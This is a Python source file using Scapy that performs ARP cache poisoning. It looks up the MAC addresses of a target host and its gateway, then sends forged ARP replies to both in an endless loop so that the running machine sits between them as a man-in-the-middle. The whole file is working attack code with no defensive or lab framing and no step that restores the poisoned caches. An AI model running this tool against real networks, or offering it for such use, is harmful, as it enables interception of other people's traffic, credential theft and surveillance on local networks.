from scapy.all import *
from scapy.layers.l2 import Ether, ARP

ARP_REQUEST = 1
ARP_REPLY = 2
ARP_REQUEST_TIMEOUT = 5  # seconds
BROADCAST_MAC = "ff:ff:ff:ff:ff:ff"

logging.getLogger(scapy.__name__).setLevel(logging.WARNING)
logging.basicConfig(format='%(asctime)s %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p', level=logging.INFO)
logger = logging.getLogger()


def _get_mac(target_ip):
    arp_response = None
    while not arp_response:
        logger.info("sending who-has for {}".format(target_ip))
        arp_request = Ether(dst=BROADCAST_MAC) / ARP(op=ARP_REQUEST, pdst=target_ip)
        arp_response = srp(arp_request, timeout=ARP_REQUEST_TIMEOUT, verbose=False)[0]

    target_mac = arp_response[0][0][1].hwsrc
    logger.info("got mac: {}".format(target_mac))
    return target_mac


def _spoof_arp_cache(target_ip, target_mac, source_ip):
    """
    function sets the targets arp cache so that :param source_ip resolves to this machine's MAC
    """
    spoofed = ARP(op=ARP_REPLY, pdst=target_ip, psrc=source_ip, hwdst=target_mac)
    send(spoofed, verbose=False)


def run(target_ip, gateway_ip):
    """
    inserts this machine between target and gateway
    """
    target_mac = _get_mac(target_ip)
    gateway_mac = _get_mac(gateway_ip)

    logger.info("starting spoof")

    while True:
        _spoof_arp_cache(target_ip, target_mac, gateway_ip)
        _spoof_arp_cache(gateway_ip, gateway_mac, target_ip)
